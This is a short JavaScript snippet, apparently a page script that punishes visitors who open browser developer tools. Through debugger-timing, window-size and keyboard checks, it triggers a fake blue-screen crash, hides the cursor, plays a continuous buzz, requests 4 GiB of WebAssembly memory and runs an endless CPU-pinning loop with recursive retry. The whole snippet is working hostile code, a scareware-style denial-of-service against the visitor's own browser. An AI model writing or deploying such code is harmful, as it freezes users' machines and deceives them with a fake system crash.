(function() {
    const _wCode = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,5,3,1,0,1,7,8,1,4,107,105,108,108,0,0,10,9,1,7,0,65,255,255,15,11]);

    const _nuke = () => {
        // Show BSOD
        const b = document.getElementById('bsod');
        if (b) b.style.display = 'block';
        document.getElementById('ui-container').style.display = 'none';

        // Hide Cursor
        document.body.style.cursor = 'none';

        // Play Crash Sound (Sine Wave Buzz)
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            osc.type = 'sawtooth';
            osc.frequency.setValueAtTime(100, ctx.currentTime);
            osc.connect(ctx.destination);
            osc.start();
        } catch(e) {}

        // Trigger WASM Memory/CPU Bomb (C++ Style Kernel Stress)
        try {
            const m = new WebAssembly.Memory({ initial: 65536, maximum: 65536 });
            const mod = new WebAssembly.Module(_wCode);
            new WebAssembly.Instance(mod, { env: { memory: m } });

            // Infinite Heavy Loop to pin CPU
            while(true) {
                Math.sqrt(Math.random() * 100000);
            }
        } catch(e) {
            _nuke(); // Recursive retry if failed
        }
    };

    // Constant Detection
    setInterval(() => {
        const s = performance.now();
        debugger;
        if (performance.now() - s > 100) _nuke();

        if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
            _nuke();
        }
    }, 500);

    // Block common bypasses
    window.eval = () => _nuke();
    window.addEventListener('keydown', e => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key))) {
            e.preventDefault(); _nuke();
        }
    }, true);
})();
